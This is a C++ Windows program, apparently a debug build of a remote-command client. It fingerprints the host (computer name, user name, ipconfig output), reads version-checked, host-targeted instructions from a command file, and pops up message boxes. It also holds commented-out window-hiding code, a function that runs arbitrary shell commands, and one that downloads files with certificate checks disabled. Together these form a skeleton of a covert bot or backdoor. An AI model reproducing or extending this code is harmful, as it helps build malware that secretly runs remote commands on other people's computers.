#include <io.h>
#include <stdio.h>
#include <windows.h>

#include <vector>
#include <fstream> 
#include <iostream>
using namespace std;

string v1,v2;
vector<string>lable;




void ini()
{
	cout<<"@Under Function ini\n";
//	HWND hwnd;
//	if(hwnd=::FindWindow("ConsoleWindowClass",NULL))
//	{
//		::ShowWindow(hwnd,SW_HIDE);
//	}
	cout<<"@We've tried to hide the window but welcome to debug!\n";


	lable.push_back("ALL");
	char tmp[512],ch;
	DWORD buf_size=sizeof(tmp) - 1;
	GetComputerName(tmp,&buf_size);
	lable.push_back(tmp);
	GetUserName(tmp,&buf_size);
	lable.push_back(tmp);
	
	system("ipconfig /all >temp.dat");
	ifstream tempIn("temp.dat");
	while(tempIn>>ch)
	{
		if(ch==':')
		{
			tempIn>>tmp;
			lable.push_back(tmp);
		}
	}
	cout<<"@Let's show the information we collect.\n\n";
	for(int i=0;i<lable.size();++i)
		cout<<lable[i]<<' ';
	cout<<"\n\n";
		
		
	if(_access("rm.dat",0)==-1)
	{
		cout<<"@No rm.dat,but we're making it.\n";
		system("echo 0000-00-0 0 >rm.dat");
	}
	
	ifstream rmIn("rm.dat");
	rmIn>>v1>>v2;
	printf("@v1[%s],v2[%s]\n",v1.c_str(),v2.c_str());
}




int wgetCall(string URI)
{
	cout<<"@Under Function ini\n";
	int p=URI.find_last_of('/');
	string loc(URI.substr(p+1,URI.size()+1-(p+1)));
	string loc1(loc+".1") , cmd;
	printf("@URI:[%s] loc:[%s] loc1:[%s]\n",URI.c_str(),loc.c_str(),loc1.c_str());
	
	
	cmd="del "+loc;
	cout<<"Running "<<cmd<<endl;
	system(cmd.c_str());
	
	cmd="wget --no-check-certificate "+URI;
	cout<<"Running "<<cmd<<endl;
	return system(cmd.c_str());
}




void msg(istream& is)
{
	string hello,caption;
	int v;
	getline(is,hello);
	getline(is,caption);

	is>>v;
	printf("@Watch out!hello[%s],caption[%s],v[%d]",hello.c_str(),caption.c_str(),v);
	MessageBox(NULL,hello.c_str(),caption.c_str(),v);
}

int sys(istream& is)
{
	string s;
	getline(is,s);
	return system(s.c_str());
}




int main()
{
	ini();

	string tmp,vir1,vir2;
	int val,f=0;
	char ch;
	ifstream cmdIn("G9.cmd");

	while(cmdIn>>tmp)
	{
		f=0;
		if(tmp.find("SMTP2")==-1)
			{puts("@1-1Fail\n");continue;}

		cmdIn>>vir1>>vir2>>val;
		printf("@We got vir1[%s],vir2[%s],val[%d]\n",vir1.c_str(),vir2.c_str(),val);
		if((vir1>v1)||(vir1==v1&&vir2>v2)||(val==2))
			f=1;
		if(f==0) {puts("@1-2Fail\n");continue;}
		
		ofstream tmOut("rm.dat");
		tmOut<<vir1<<' '<<vir2;
		puts("@Updated rm.dat\n");
		
		while(cmdIn>>ch)
		{
			f=0;
			if(ch!='#')
				{puts("@2-1Fail\n");continue;}
				
			cmdIn>>tmp;
			for(int i=0;i<lable.size();++i)
				if(lable[i]==tmp) f=1;
			if(f==0) {puts("@2-2Fail\n");continue;}
			
			
			while(cmdIn>>ch)
			{
				if(ch!='!')
					{puts("@3-1Fail\n");continue;}
				getline(cmdIn,tmp);
				for(int i=1;i<tmp.size();++i)
					tmp[i]=toupper(tmp[i]);
				if(tmp.find("MSG")!=-1) msg(cmdIn);
			}
		}
	}
	return 0;
}
